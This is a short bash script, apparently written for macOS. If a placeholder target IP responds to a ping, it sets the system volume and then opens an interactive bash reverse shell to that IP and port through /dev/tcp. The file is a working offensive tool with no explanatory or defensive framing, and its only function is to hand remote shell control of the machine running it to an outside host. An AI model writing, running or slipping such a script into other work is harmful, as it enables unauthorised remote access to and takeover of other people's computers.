#!/usr/bin/env bash

# define magic variables
declare -r TARGET_IP='<ip>'
declare -r TARGET_PORT='<port>'

# functions
function setVolume() {
  osascript -e 'set volume output volume 50'
}

function startReverseShell() {
  /usr/bin/env bash -i >& /dev/tcp/"${TARGET_IP}"/"${TARGET_PORT}" 0>&1
}

function main() {
  if ping -t 2 -c 1 "${TARGET_IP}" &> /dev/null; then
    setVolume
    startReverseShell
  fi
}

main
